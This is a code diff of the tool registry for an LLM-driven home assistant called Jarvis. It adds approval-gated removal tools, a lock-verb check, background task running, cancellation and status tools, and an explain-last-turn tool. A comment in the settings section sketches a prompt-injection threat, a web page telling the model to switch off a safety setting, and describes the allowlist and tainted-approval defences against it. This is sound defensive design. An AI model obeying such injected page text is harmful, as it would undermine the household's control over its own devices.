+        # reached cover.toggle on the live house (27 Aug 2026) — right once and
+        # wrong the next time — so the toggle names what it is for and what it
+        # is not, and covers are not on its list at all.
+        description = (
+            "Flip lights, switches or fans to their other state — only when the "
+            "user says toggle or flip. 'Turn on' and 'turn off' are turn_on and "
+            "turn_off; a cover, blind or garage door is opened or closed, never "
+            "flipped. Give a name, an area, or both."
+            if action == "toggle"
+            else f"Turn {verb} lights, switches, fans, covers, media players or scenes. "
+            "Give a name, an area, or both."
+        )
         registry.register(
             name=action,
-            description=(
-                f"Turn {verb} lights, switches, fans, covers, media players or scenes. "
-                "Give a name, an area, or both."
-            ),
+            description=description,
             parameters=schema_object(properties),
             handler=lambda args, ctx, _a=action: _switch(args, ctx, _a),
             tier=TIER_DIRECT,
@@ -1691,11 +2265,18 @@ def register_builtin_tools(
             return {"status": "error", "error": resolution.error}
         changed: list[dict[str, Any]] = []
         failed: dict[str, str] = {}
+        # The ends of the range ARE open and close: "Close the living room
+        # window" came through as position 0 on the twentieth house (27 Aug
+        # 2026), and a cover with no position control (the demo's, many real
+        # ones) has only open_cover/close_cover to answer with.
+        if position in (0, 100):
+            service = "close_cover" if position == 0 else "open_cover"
+            data: dict[str, Any] = {"entity_id": resolution.entity_ids}
+        else:
+            service = "set_cover_position"
+            data = {"entity_id": resolution.entity_ids, "position": position}
         try:
-            result = await _call_service(
-                jarvis, "cover", "set_cover_position",
-                {"entity_id": resolution.entity_ids, "position": position}, context,
-            )
+            result = await _call_service(jarvis, "cover", service, data, context)
         except ToolError as exc:
             return {"status": "error", "error": str(exc)}
         _merge_service_result(jarvis, result, changed, failed)
@@ -1776,7 +2357,12 @@ def register_builtin_tools(
 
     registry.register(
         name="media_control",
-        description="Control a speaker or TV: play, pause, stop, next, previous, volume, play_media.",
+        description=(
+            "Control a speaker or TV: play, pause, stop, next, previous, volume, play_media. "
+            "'Play something' with nothing named is `play` on that player — it resumes or "
+            "starts what the player has; ask what to play only when the words ask for a "
+            "choice."
+        ),
         parameters=schema_object(
             {
                 **{k: v for k, v in target_properties.items() if k != "domain"},
@@ -1864,8 +2450,28 @@ def register_builtin_tools(
         _merge_service_result(jarvis, result, changed, failed)
         return _outcome(changed, failed)
 
+    def _lock_verb_refusal(arguments: dict[str, Any], context: Any = None) -> str | None:
+        """The request's own verb is the one policy the arguments cannot carry.
+
+        "Lock the front door again." became action=unlock on the twentieth
+        house (27 Aug 2026) — the model mirrored the turn before — and the yes
+        that followed unlocked an unlocked door. Checked BEFORE the hold (a
+        refusal runs before the approval path), so the person is never asked
+        to approve the opposite of what they said.
+        """
+        action = str(arguments.get("action") or "lock").strip().lower()
+        said = _utterance_of(jarvis, context).lower()
+        opens_with = re.match(r"^\W*(?:please\s+|jarvis[,\s]+)?(lock|unlock)\b", said)
+        if opens_with and opens_with.group(1) != action:
+            return (
+                f"the request said {opens_with.group(1)!r}; call lock_control with "
+                f"action {opens_with.group(1)!r}, not {action!r}"
+            )
+        return None
+
     registry.register(
         name="lock_control",
+        refuse=_lock_verb_refusal,
         description=(
             "Lock or unlock a door. This ALWAYS requires the user's explicit approval "
             "outside this conversation — you cannot complete it yourself."
@@ -1901,7 +2507,12 @@ def register_builtin_tools(
         driving = _config_state("driving")
         awake = _config_state("awake")
         active_device = _config_state("active_device")
-        hour = time.localtime().tm_hour
+        # The house's clock, not the process's: in a container with TZ unset
+        # `time.localtime()` is UTC, and "awake" was answered from the wrong
+        # hour (the agentic audit, 27 Aug 2026).
+        from ..automation.util import get_clock
+
+        hour = get_clock(jarvis).now().hour
 
         home = presence == STATE_HOME if presence not in (None, STATE_UNKNOWN, STATE_UNAVAILABLE) else None
         is_driving = driving == STATE_ON if driving is not None else False
@@ -1936,6 +2547,93 @@ def register_builtin_tools(
         handler=_get_user_context,
     )
 
+    def _background_worker(description_text: str, task_id: str):
+        """One turn, driven by the engine instead of by somebody waiting.
+
+        "Look into X and tell me later" is a conversation turn nobody is sitting
+        in front of — not a new kind of work — so it runs through the same agent
+        with the same tools and the same round limit, and reports through the
+        task it was given.
+        """
+
+        async def run(_task_id: str) -> None:
+            agent = jarvis.data.get("llm")
+            registry_tasks = getattr(jarvis, "tasks", None)
+            if agent is None:
+                raise RuntimeError("there is no conversation agent on this server")
+            # Picked back up after a restart (M85): the model is told which
+            # steps were already recorded done, so it plans the rest rather
+            # than the whole job again, and the user hears "picked back up"
+            # from the completion rather than a silent second run.
+            description = _resumed_description(registry_tasks, task_id, description_text)
+            # A request with more than one thing in it is planned, acted on
+            # step by step and verified — the steps land on the task, so
+            # somebody can see what Jarvis intends before it does it. A single
+            # action skips all of that: planning it costs a model call to be
+            # told what was already obvious.
+            from .plan import needs_a_plan
+
+            planned = needs_a_plan(description)
+            if registry_tasks is not None:
+                # Only the unplanned path gets placeholders. A planned task's
+                # steps ARE the plan, and two invented ones in front of it
+                # would be a step list nobody chose — the console would show
+                # "work on it" as step 1 of a plan whose first step is
+                # something else entirely.
+                await registry_tasks.async_update(
+                    task_id,
+                    add_steps=() if planned else ["work on it", "write it up"],
+                    detail="planning" if planned else "working",
+                )
+                registry_tasks.raise_if_cancelled(task_id)
+                if not planned:
+                    await registry_tasks.async_update(task_id, step=0, step_status="running")
+
+            if planned:
+                answer = await agent.plan_and_run(description, task_id)
+                if registry_tasks is not None:
+                    registry_tasks.raise_if_cancelled(task_id)
+                    await registry_tasks.async_update(
+                        task_id, status="done", result=answer[:4000], detail="done"
+                    )
+                return
+
+            # `converse` is an async generator of text deltas — the streaming
+            # contract every other caller uses. Nobody is watching this one, so
+            # the deltas are collected and the answer is what they add up to.
+            chunks: list[str] = []
+            async for delta in agent.converse(
+                f"{description}\n\n(This is background work: nobody is waiting on this "
+                "reply. Do it, then summarise what you found in a few sentences.)",
+                conversation_id=f"background-{task_id}",
+            ):
+                chunks.append(str(delta))
+            answer = "".join(chunks).strip() or getattr(
+                getattr(agent, "last_result", None), "text", ""
+            )
+            if registry_tasks is not None:
+                registry_tasks.raise_if_cancelled(task_id)
+                await registry_tasks.async_update(
+                    task_id,
+                    step=0,
+                    step_status="done",
+                    status="done",
+                    result=answer[:4000],
+                    detail="done",
+                )
+
+        return run
+
+    # Registered once, so a queue item restored after a restart can be given a
+    # worker again — `register_kind` had no caller, and every restored item
+    # failed "no worker for 'background'" (the agentic audit, 27 Aug 2026).
+    _engine = getattr(jarvis, "taskengine", None)
+    if _engine is not None and hasattr(_engine, "register_kind"):
+        _engine.register_kind(
+            "background",
+            lambda item: _background_worker(str(item.payload.get("description") or ""), item.task_id),
+        )
+
     # --- run_background_task (tier 2) -------------------------------------
     #
     # This used to be an empty seam, and the shape of the lie is worth keeping
@@ -1952,10 +2650,12 @@ def register_builtin_tools(
     # listening — nothing was, but breaking a published event to fix a
     # different bug is its own mistake.
     #
-    # What it STILL does not do is execute the work: there is no worker yet.
-    # So the honest answer to the model is "recorded", not "started", and the
-    # message says a person will see it rather than that a result is coming.
-    # Overstating this again would recreate the bug with more machinery.
+    # And it now RUNS. `jarvis.taskengine` takes the work, queues it behind
+    # whatever else is going on, and drives it — which is why the answer to the
+    # model is "started" rather than "recorded". The work itself is one
+    # conversation turn with the tools this registry already offers, bounded by
+    # the same round limit as any other turn: "look into X and tell me later"
+    # is a turn somebody is not waiting for, not a new kind of thing.
     async def _run_background_task(args: dict[str, Any], context: Any) -> Any:
         description = str(args.get("description") or args.get("task") or "").strip()
         if not description:
@@ -1994,14 +2694,40 @@ def register_builtin_tools(
                     "was not recorded — tell the user you cannot take it on"
                 ),
             }
+        started = False
+        engine = getattr(jarvis, "taskengine", None)
+        if engine is not None:
+            started = engine.submit(
+                task_id,
+                _background_worker(description, task_id),
+                kind="background",
+                retries=1,
+                # Safe to run again from the start: the job is a conversation
+                # turn whose reads repeat harmlessly and whose actions are
+                # gated by their own tools' tiers — a re-run re-asks for
+                # anything that needs asking. So a restart picks it back up
+                # (M85) instead of leaving "interrupted when Jarvis restarted".
+                idempotent=True,
+                payload={"description": description},
+            )
+        if not started:
+            await tasks.async_update(
+                task_id,
+                status="error",
+                error="the queue is full; nothing was started",
+            )
+            return {
+                "status": "error",
+                "error": "too much is already queued — say so rather than promising this",
+            }
         return {
-            "status": "recorded",
+            "status": "started",
             "task_id": task_id,
             "description": description,
             "message": (
-                "Noted on the task list, where the user can see it. Nothing is "
-                "running it yet, so do NOT tell them it is under way or that a "
-                "result is coming — say it has been written down."
+                "Queued and being worked on. It appears on the task list with "
+                "its progress, and the result lands there. Say it is under way "
+                "— briefly — and do not invent what it will find."
             ),
         }
 
@@ -2270,6 +2996,203 @@ def register_builtin_tools(
         handler=_vacuum_control,
     )
 
+    # --- stopping something ---------------------------------------------
+    #
+    # "Actually, stop that" is the second thing anybody says after asking for a
+    # long job, and until now the honest answer was "I have no tool to stop a
+    # background task" — which the model said, correctly, while the job ran on.
+    # Cancelling is Tier 1: it stops work rather than doing any, and the thing
+    # it stops is something the same person just started.
+    async def _cancel_task(args: dict[str, Any], context: Any) -> Any:
+        tasks = getattr(jarvis, "tasks", None)
+        if tasks is None:
+            return {"status": "error", "error": "this server does not track tasks"}
+        wanted = str(args.get("task_id") or "").strip()
+        target = tasks.get(wanted) if wanted else None
+        if target is None:
+            # "That one" almost always means the most recent job that is still
+            # going. Naming an id is possible and nobody says an id out loud.
+            running = [task for task in tasks.tasks if not task.finished]
+            if not running:
+                return {
+                    "status": "error",
+                    "error": "nothing is running, so there is nothing to stop",
+                }
+            if wanted:
+                return {
+                    "status": "error",
+                    "error": f"there is no task {wanted!r}",
+                    "running": [t.id for t in running],
+                }
+            target = running[-1]
+        if target.finished:
+            return {
+                "status": "error",
+                "error": f"that one already finished ({target.status})",
+            }
+        from ..api import common as api_common
+
+        outcome = await api_common.async_cancel_task(jarvis, target.id)
+        return {
+            "status": "ok" if outcome.get("cancelled") else "error",
+            "task_id": target.id,
+            "title": target.title,
+            # The honest bit, which `async_cancel_task` documents: this is a
+            # REQUEST. A worker that does not check its cancellation flag keeps
+            # going, and every worker in this repo checks.
+            "message": (
+                "Stopped. Tell the user it has been cancelled — the worker "
+                "checks between steps, so anything already finished stays done."
+            ),
+        }
+
+    async def _task_status(args: dict[str, Any], context: Any) -> Any:
+        """How the background work is going, for the model to say out loud.
+
+        Jarvis could START jobs and STOP them and could not answer "how is that
+        going" — it said, truthfully and uselessly, "I have no way to check on
+        the job's progress from here". Every screen has had this since M12; the
+        thing people actually ask, in the room, out loud, had nothing behind it.
+        """
+        tasks = getattr(jarvis, "tasks", None)
+        if tasks is None:
+            return {"status": "error", "error": "this server does not track tasks"}
+        wanted = str(args.get("task_id") or "").strip()
+        if wanted:
+            target = tasks.get(wanted)
+            if target is None:
+                return {"status": "error", "error": f"there is no task {wanted!r}"}
+            rows = [target]
+        else:
+            running = [task for task in tasks.tasks if not task.finished]
+            # Nothing running: the last few that finished are what "how did
+            # that go" means, and answering "nothing is running" to that
+            # question is a non-answer.
+            rows = running or list(tasks.tasks)[-3:]
+        if not rows:
+            return {"status": "ok", "tasks": [], "message": "nothing has run yet"}
+        return {
+            "status": "ok",
+            "tasks": [
+                {
+                    "id": task.id,
+                    "title": task.title,
+                    "kind": task.kind,
+                    "state": task.status,
+                    "step": task.detail or "",
+                    "steps_done": sum(1 for step in task.steps if step.status == "done"),
+                    "steps_total": len(task.steps),
+                    "result": (task.result or task.error or "")[:400],
+                }
+                for task in rows[-5:]
+            ],
+        }
+
+    # --- explain_last_turn (M95) -------------------------------------------
+    async def _explain_last_turn(args: dict[str, Any], context: Any) -> Any:
+        """The previous turn in this conversation, from the record: the tools
+        it called (name, the arguments in brief, whether they succeeded) and
+        the remembered notes it was given. Server-authored — "why did you say
+        that?" was being answered by reconstruction, once with an apology for
+        a mistake that had not been made (the agentic audit, 27 Aug 2026)."""
+        agent = jarvis.data.get("llm")
+        conversation_id, _spoken = registry._turn_facts(context)
+        if not conversation_id:
+            # The turn's own facts when they were recorded for this context;
+            # otherwise the conversation the agent last finished, which is
+            # the previous turn by definition unless a new thread began this
+            # instant — a rarer wrong answer than "no earlier turn" for every
+            # caller that hands the registry a context of its own.
+            conversation_id = getattr(agent, "last_conversation_id", None)
+        archive = getattr(agent, "archive", None)
+        conversation = archive.get(conversation_id) if archive is not None and conversation_id else None
+        turns = list(getattr(conversation, "turns", []) or [])
+        # The turn being explained is the last assistant turn BEFORE the one
+        # now in progress; the current user turn is not archived until it ends.
+        assistant_turns = [t for t in turns if getattr(t, "role", "") == "assistant"]
+        if not assistant_turns:
+            return {"status": "ok", "explained": False,
+                    "note": "There is no earlier turn in this conversation to explain; say so plainly."}
+        last = assistant_turns[-1]
+        user_before = ""
+        for t in reversed(turns[: turns.index(last)]):
+            if getattr(t, "role", "") == "user":
+                user_before = str(getattr(t, "content", "") or "")
+                break
+        calls = []
+        for call in list(getattr(last, "tool_calls", []) or [])[:12]:
+            if not isinstance(call, dict):
+                continue
+            result = call.get("result")
+            status = result.get("status") if isinstance(result, dict) else None
+            arguments = call.get("arguments") if isinstance(call.get("arguments"), dict) else {}
+            brief = {k: (str(v)[:80]) for k, v in list(arguments.items())[:4]}
+            calls.append({"tool": call.get("name"), "arguments": brief, "status": status or ("ok" if result is not None else "unknown")})
+        memory_used: list[str] = []
+        last_result = getattr(agent, "last_result", None)
+        if last_result is not None and getattr(agent, "last_conversation_id", None) == conversation_id:
+            memory_used = [str(m)[:160] for m in list(getattr(last_result, "memory_used", []) or [])[:6]]
+        return {
+            "status": "ok",
+            "explained": True,
+            "asked": user_before[:200],
+            "said": str(getattr(last, "content", "") or "")[:300],
+            "tools_called": calls,
+            "memory_used": memory_used,
+            "note": (
+                "Answer from THIS record: name the tools and what they looked at, or say that "
+                "no tool was called and the answer came from the house summary or the model itself. "
+                "Do not apologise for what the record does not show, and do not call the tools again "
+                "to explain them."
+            ),
+        }
+
+    registry.register(
+        name="explain_last_turn",
+        description=(
+            "Why Jarvis said what it said last turn: the tools it actually called, what they "
+            "looked at, and the remembered notes it was given — from the record, never a guess. "
+            "Use it for \"why did you say that?\", \"what did you look at?\", \"how do you know?\"."
+        ),
+        parameters=schema_object({}),
+        handler=_explain_last_turn,
+        read_only=True,
+    )
+
+    registry.register(
+        name="task_status",
+        description=(
+            "How a background job is going: what it is doing, how far through, "
+            "and its result if it finished. No id means whatever is running."
+        ),
+        parameters=schema_object(
+            {
+                "task_id": {
+                    "type": "string",
+                    "description": "Which job. Omit for whatever is running.",
+                }
+            },
+        ),
+        handler=_task_status,
+    )
+
+    registry.register(
+        name="cancel_task",
+        description=(
+            "Stop a background job. With no id, the most recent one still "
+            "running — what \"stop that\" means."
+        ),
+        parameters=schema_object(
+            {
+                "task_id": {
+                    "type": "string",
+                    "description": "Which job. Omit for the one still running.",
+                }
+            },
+        ),
+        handler=_cancel_task,
+    )
+
     registry.register(
         name="run_background_task",
         description=(
@@ -2333,7 +3256,9 @@ def register_builtin_tools(
             "anything only they know — the address of a service on their "
             "network, which of several things they meant, a preference — "
             "instead of guessing. Offer `choices` when there is a knowable set "
-            "of answers. The question appears on their console and their phone."
+            "of answers. The question is put to them where they are — the "
+            "console's held bar, and a paired phone if one is connected — so "
+            "say it is waiting for them, not where."
         ),
         parameters=schema_object(
             {
@@ -2357,6 +3282,250 @@ def register_builtin_tools(
         # The one writable key. Everything else about the request is frozen
         # when it is raised, exactly as it is for an action.
         answerable="answer",
+    )
+
+    # --- the house's devices, listed -------------------------------------------
+    #
+    # `list_my_devices` is the phones and desktops running Jarvis; this is the
+    # house's device registry — the bridge, the thermostat, the things the
+    # Devices screen groups entities under. It exists so `remove_device` has
+    # something to be told an id by: a refusal that says "call list_devices"
+    # must name a tool the model has (`TOOLBOX_RULE`).
+    async def _list_devices(args: dict[str, Any], context: Any) -> Any:
+        wanted = str(args.get("area") or "").strip().lower()
+        out: list[dict[str, Any]] = []
+        for device in jarvis.devices.devices.values():
+            area_name = _area_name(jarvis, device.area_id)
+            if wanted and wanted not in {(area_name or "").lower(), (device.area_id or "").lower()}:
+                continue
+            entity_ids = sorted(
+                entry.entity_id
+                for entry in jarvis.entities.entities.values()
+                if entry.device_id == device.id
+            )
+            row: dict[str, Any] = {
+                "device_id": device.id,
+                "name": device.name,
+                "entities": entity_ids,
+            }
+            if device.manufacturer:
+                row["manufacturer"] = device.manufacturer
+            if device.model:
+                row["model"] = device.model
+            if area_name:
+                row["area"] = area_name
+            if device.disabled:
+                row["disabled"] = True
+            out.append(row)
+        return {"status": "ok", "count": len(out), "devices": out}
+
+    registry.register(
+        name="list_devices",
+        description=(
+            "List the house's devices — the bridges, hubs and appliances that entities "
+            "belong to — with their ids and the entities on each. Use it before "
+            "remove_device, or when the user names a device rather than a thing."
+        ),
+        parameters=schema_object(
+            {"area": {"type": "string", "description": "Restrict to one room/area."}},
+        ),
+        handler=_list_devices,
+        read_only=True,
+    )
+
+    # --- taking things out of the house (M69) --------------------------------
+    #
+    # "Can you remove all of the elements of the house?" — "I have no tool for
+    # deleting entities." Now there is, and it is Tier 3 with the targets
+    # pinned, exactly as `lock_control` pins its doors: the approval names the
+    # entity ids it will remove, resolved when it is raised, and what runs
+    # after the yes is what was shown. Both tools run the console's own delete
+    # path (`Jarvis.async_remove_entity` / `async_remove_device`) — never a
+    # second one — so "removed" means the same thing from the Devices screen
+    # and from the voice.
+    #
+    # "All of the elements" is refused with a sentence before anything is
+    # held. An approval must show what it removes; a card that said "all"
+    # would be consent to whatever the house happened to hold. The refusal
+    # names what to do instead, so the next round can list and choose.
+
+    def _wants_everything(value: Any) -> bool:
+        text = str(value or "").strip().lower()
+        return text in REMOVE_WILDCARDS or text.endswith(" everything")
+
+    def _named_entity_ids(args: dict[str, Any]) -> list[str]:
+        raw = args.get("entity_ids")
+        if raw is None:
+            raw = args.get("entity_id")
+        out: list[str] = []
+        for item in _as_list(raw):
+            text = str(item or "").strip().lower()
+            if text and text not in out:
+                out.append(text)
+        return out
+
+    def _entity_exists(entity_id: str) -> bool:
+        return jarvis.entities.get(entity_id) is not None or jarvis.states.get(entity_id) is not None
+
+    def _resolve_removal(args: dict[str, Any]) -> tuple[list[str], str | None]:
+        """The concrete ids a removal names, or the sentence refusing it."""
+        ids = _named_entity_ids(args)
+        name = str(args.get("name") or "").strip()
+        if not ids and not name:
+            return [], (
+                "Name the entities to remove, by entity id — an approval must show "
+                "exactly what it removes. Call list_entities for their ids, then "
+                "remove_entities with the ones you mean."
+            )
+        if _wants_everything(name) or any(_wants_everything(i) for i in ids):
+            return [], (
+                "I won't remove everything at once: name each entity by its id so the "
+                "approval shows exactly what goes. Call list_entities for the ids, then "
+                f"remove_entities with up to {MAX_REMOVE_AT_ONCE} of them at a time."
+            )
+        if name and not ids:
+            resolution = _resolve({"name": name})
+            if not resolution.ok:
+                return [], resolution.error or f"nothing here is called {name!r}"
+            ids = list(resolution.entity_ids)
+        unknown = [i for i in ids if not _entity_exists(i)]
+        if unknown:
+            return [], (
+                f"No entity called {', '.join(unknown)} on this Jarvis. Call list_entities "
+                "and use the ids it gives."
+            )
+        if len(ids) > MAX_REMOVE_AT_ONCE:
+            return [], (
+                f"That is {len(ids)} entities; remove at most {MAX_REMOVE_AT_ONCE} in one "
+                "approval so the person can read what they are agreeing to."
+            )
+        return ids, None
+
+    def _refuse_remove_entities(args: dict[str, Any]) -> str | None:
+        return _resolve_removal(args)[1]
+
+    def _pin_remove_entities(args: dict[str, Any]) -> dict[str, Any]:
+        ids, _ = _resolve_removal(args)
+        # The ids, and nothing fuzzy: the executor removes exactly these.
+        return {"entity_ids": ids, "entity_id": None, "name": None}
+
+    async def _remove_entities(args: dict[str, Any], context: Any) -> Any:
+        ids = _named_entity_ids(args)
+        if not ids:
+            return {"status": "error", "error": "no entity ids were pinned to this removal"}
+        removed: list[str] = []
+        missing: list[str] = []
+        ctx = context if isinstance(context, Context) else Context(origin="llm")
+        for entity_id in ids:
+            outcome = await jarvis.async_remove_entity(entity_id, ctx)
+            (removed if outcome.get("removed") else missing).append(entity_id)
+        status = "ok" if removed and not missing else ("partial" if removed else "error")
+        payload: dict[str, Any] = {"status": status, "removed": removed}
+        if missing:
+            payload["missing"] = missing
+            payload["error"] = f"{', '.join(missing)} was not on this Jarvis"
+        return payload
+
+    registry.register(
+        name="remove_entities",
+        description=(
+            "Remove entities from the house for good — their state, their registry "
+            "entry, their place on dashboards. Name them by entity id (at most "
+            f"{MAX_REMOVE_AT_ONCE} at a time); never 'all' or 'everything'. This ALWAYS "
+            "requires the user's explicit approval, which shows exactly the ids that go."
+        ),
+        parameters=schema_object(
+            {
+                "entity_ids": {
+                    "type": "array",
+                    "items": {"type": "string"},
+                    "description": "The entity ids to remove, e.g. ['light.old_lamp'].",
+                },
+                "name": {
+                    "type": "string",
+                    "description": "Or what the user called one thing, e.g. 'the old lamp'.",
+                },
+            },
+        ),
+        handler=_remove_entities,
+        tier=TIER_APPROVAL,
+        refuse=_refuse_remove_entities,
+        pin=_pin_remove_entities,
+    )
+
+    def _find_device(args: dict[str, Any]) -> tuple[Any, str | None]:
+        device_id = str(args.get("device_id") or "").strip()
+        name = str(args.get("name") or "").strip()
+        if _wants_everything(device_id) or _wants_everything(name):
+            return None, (
+                "I won't remove every device at once: name the device, and the approval "
+                "will show it and every entity that goes with it. Call list_devices for "
+                "their names and ids."
+            )
+        if not device_id and not name:
+            return None, (
+                "Name the device to remove, by id or by name — an approval must show "
+                "exactly what it removes. Call list_devices for them."
+            )
+        if device_id:
+            device = jarvis.devices.devices.get(device_id)
+            if device is None:
+                return None, f"No device with id {device_id!r} on this Jarvis; call list_devices."
+            return device, None
+        wanted = name.lower()
+        matches = [d for d in jarvis.devices.devices.values() if d.name.lower() == wanted]
+        if not matches:
+            matches = [d for d in jarvis.devices.devices.values() if wanted in d.name.lower()]
+        if len(matches) == 1:
+            return matches[0], None
+        if not matches:
+            return None, f"No device called {name!r} on this Jarvis; call list_devices."
+        names = ", ".join(f"{d.name} ({d.id})" for d in matches[:6])
+        return None, f"{len(matches)} devices match {name!r}: {names}. Say which, by id."
+
+    def _refuse_remove_device(args: dict[str, Any]) -> str | None:
+        return _find_device(args)[1]
+
+    def _pin_remove_device(args: dict[str, Any]) -> dict[str, Any]:
+        device, _ = _find_device(args)
+        if device is None:
+            return {}
+        entity_ids = sorted(
+            entry.entity_id
+            for entry in jarvis.entities.entities.values()
+            if entry.device_id == device.id
+        )
+        # The id, the name the person knows it by, and every entity that goes
+        # with it: the approval is the whole of what will happen.
+        return {"device_id": device.id, "name": device.name, "entity_ids": entity_ids}
+
+    async def _remove_device(args: dict[str, Any], context: Any) -> Any:
+        device_id = str(args.get("device_id") or "").strip()
+        if not device_id:
+            return {"status": "error", "error": "no device id was pinned to this removal"}
+        ctx = context if isinstance(context, Context) else Context(origin="llm")
+        outcome = await jarvis.async_remove_device(device_id, ctx)
+        if not outcome.get("removed"):
+            return {"status": "error", "error": f"no device with id {device_id!r} any more"}
+        return {"status": "ok", **outcome}
+
+    registry.register(
+        name="remove_device",
+        description=(
+            "Remove a device from the house for good, with every entity that belongs to "
+            "it. Name it by id or by name; never 'all'. This ALWAYS requires the user's "
+            "explicit approval, which shows the device and the entities that go with it."
+        ),
+        parameters=schema_object(
+            {
+                "device_id": {"type": "string", "description": "The device's id, if known."},
+                "name": {"type": "string", "description": "Or its name, e.g. 'Hue bridge'."},
+            },
+        ),
+        handler=_remove_device,
+        tier=TIER_APPROVAL,
+        refuse=_refuse_remove_device,
+        pin=_pin_remove_device,
     )
 
     # --- building the house -------------------------------------------------
@@ -2441,7 +3610,60 @@ def register_builtin_tools(
             result = await async_create_automation(jarvis, {"automation": config})
         except ApiError as exc:
             return {"status": "error", "error": exc.message}
-        return {"status": "ok", "automation": result.get("automation", result)}
+        # Read back (M97): the one thing that lets a person catch a wrong
+        # trigger before it runs. The model is told to say it, not to claim
+        # the routine has done anything yet.
+        from ..automation.authored import describe
+
+        automation = result.get("automation", result)
+        readback = describe(automation if isinstance(automation, dict) else config)
+        return {
+            "status": "ok",
+            "automation": automation,
+            "readback": readback,
+            "note": f"Tell the user the routine as recorded — {readback!r} — so they can correct it; it has not run yet.",
+        }
+
+    async def _list_automations(args: dict[str, Any], context: Any) -> Any:
+        """The routines, authored and installed, each with its readback (M97)."""
+        from ..automation.authored import describe, get_authored
+
+        authored = []
+        try:
+            for entry in get_authored(jarvis).entries():
+                authored.append({
+                    "id": entry.get("id"), "alias": entry.get("alias"),
+                    "readback": describe(entry), "enabled": entry.get("enabled", True),
+                })
+        except Exception:  # noqa: BLE001 - a house without authored routines lists none
+            _LOGGER.debug("Could not list the authored automations", exc_info=True)
+        installed = []
+        for state in jarvis.states.all("automation"):
+            installed.append({
+                "entity_id": state.entity_id,
+                "name": (state.attributes or {}).get("friendly_name") or state.entity_id,
+                "state": state.state,
+                "last_triggered": (state.attributes or {}).get("last_triggered"),
+            })
+        return {
+            "status": "ok",
+            "authored": authored,
+            "installed": installed,
+            "count": len(authored) + len(installed),
+            "note": "Name them by alias with their readback; an empty list means the user has no routines.",
+        }
+
+    registry.register(
+        name="list_automations",
+        description=(
+            "The user's routines (automations): the ones authored here, each read back as a "
+            "sentence, and the ones installed in the house. Use it for \"what routines do I "
+            "have?\", \"what happens at seven?\", or before changing one."
+        ),
+        parameters=schema_object({}),
+        handler=_list_automations,
+        read_only=True,
+    )
 
     registry.register(
         name="create_automation",
@@ -2491,20 +3713,24 @@ def register_builtin_tools(
                 allow_local_targets=False,
             )
         except ApiError as exc:
-            return {"status": "error", "error": exc.message}
+            # The worked example rides on the REFUSAL rather than on the
+            # description. It used to be in the description, where every turn
+            # in the system paid for it — `tests/test_prompt_budget.py` is the
+            # measurement — and where it is only useful to the one turn in a
+            # thousand that writes a tool. Here it arrives exactly when the
+            # model got the shape wrong, which is when it helps.
+            return {
+                "status": "error",
+                "error": exc.message,
+                "example": CREATE_TOOL_EXAMPLE,
+            }
         return {"status": "ok", "tool": result.get("tool", result)}
 
     registry.register(
         name="create_tool",
         description=(
-            "Teach yourself a new capability by writing a tool manifest. A tool "
-            "is an HTTP call: you give it a name, say what it does, and name the "
-            "endpoint. Always needs the user's explicit approval, and they see "
-            "the whole manifest first, because a tool can name any endpoint. "
-            'Example: {"name": "bin_day", "description": "Which bin goes out '
-            'this week.", "service": {"method": "GET", "url": '
-            '"http://192.168.1.5/bins?street={{ street }}", "fields": '
-            '{"street": {"type": "string", "description": "The street name."}}}}'
+            "Write yourself a new tool: a named HTTP call. Always needs the "
+            "user's approval, and they see the whole manifest first."
         ),
         # This schema is the validator's shape, field for field. It used to be a
         # different shape entirely — `service` was declared a string
@@ -2525,24 +3751,17 @@ def register_builtin_tools(
             {
                 "name": {
                     "type": "string",
-                    "description": (
-                        "snake_case, unique, 3-48 chars. Cannot shadow a tool "
-                        "you already have."
-                    ),
+                    "description": "snake_case, unique, 3-48 chars.",
                 },
                 "description": {
                     "type": "string",
-                    "description": (
-                        "What it does, written for you to read later when "
-                        "deciding whether to call it."
-                    ),
+                    "description": "What it does, for you to read later.",
                 },
                 "service": {
                     "type": "object",
                     "description": (
-                        "The HTTP call this tool makes. `url` is required and "
-                        "must start with http:// or https://. Use {{ field }} "
-                        "to put a field's value into the url, headers or body."
+                        "The HTTP call. `url` is required; {{ field }} "
+                        "interpolates a field into url, headers or body."
                     ),
                     "properties": {
                         "url": {
@@ -2555,10 +3774,7 @@ def register_builtin_tools(
                         },
                         "fields": {
                             "type": "object",
-                            "description": (
-                                "The arguments you will pass when calling it, by "
-                                "name. Each is {type, description, required}."
-                            ),
+                            "description": "Its arguments: {type, description, required}.",
                         },
                         "headers": {
                             "type": "object",
@@ -2577,10 +3793,7 @@ def register_builtin_tools(
                 },
                 "tier": {
                     "type": "integer",
-                    "description": (
-                        "1 to run directly, 3 to need the user's approval every "
-                        "time it is called. Default 1."
-                    ),
+                    "description": "1 runs directly, 3 needs approval each call. Default 1.",
                 },
             },
             required=["name", "description", "service"],
@@ -2590,6 +3803,273 @@ def register_builtin_tools(
         # cannot. Nothing about the arguments can make writing a new capability
         # into something that happens without a human.
         tier=TIER_APPROVAL,
+    )
+
+    # --- settings (M67) -----------------------------------------------------
+    #
+    # "How can I ask it to be able to edit settings with permission." The
+    # console's settings registry (`jarvis/settings.py` SETTINGS, read through
+    # `api/common.py settings_payload`), offered to the model: one tool that
+    # reads it and one that writes through the console's own write path.
+    #
+    # Asked to enable "demo mode", the model asked what that meant — which was
+    # right, there is no such setting — but it could not have said what the
+    # settings ARE. Now it can, and a request for something adjacent gets the
+    # real name back rather than a guess or an invention.
+    #
+    # What this tool may and may not do is decided by the allowlist, not
+    # here. `SETTINGS` is a hardcoded tuple of the knobs a person changes on
+    # the console — a model, a temperature, a wake word — and the keys the
+    # safety model reads (`llm.expose`, the gated domains, CORS, the
+    # sandbox's `network_mode`) are not in it and cannot be added from a
+    # tool. So the worst a `change_setting` can do is what the console's
+    # settings page can do, under the same validation, and only after a human
+    # has read "Change Wake word from hey_jarvis to alexa" and said yes.
+    #
+    # Held, not refused, on a tainted turn. `remember` refuses after untrusted
+    # content because a human cannot audit a memory write in the two seconds
+    # an approval gets. A setting change is the opposite case: one key, one
+    # value, the old value beside the new one, pinned — exactly the sentence a
+    # person can judge. The attack to reason about is a page saying "turn
+    # local-only off": there is no such key in the allowlist, the pin refuses
+    # a key that is not there before anything is held, and a key that IS there
+    # arrives on the card marked `tainted` for the human to weigh. Refusing
+    # would also break the legitimate case, a turn that read a page and was
+    # then asked, by the user, to change the temperature.
+
+    #: Choices shown per setting in a filtered listing. The timezone list has
+    #: six hundred entries and a tool result has four thousand characters; a
+    #: model that needs the rest already knows what to ask for.
+    max_choices_shown = 12
+
+    def _settings_rows() -> list[dict[str, Any]]:
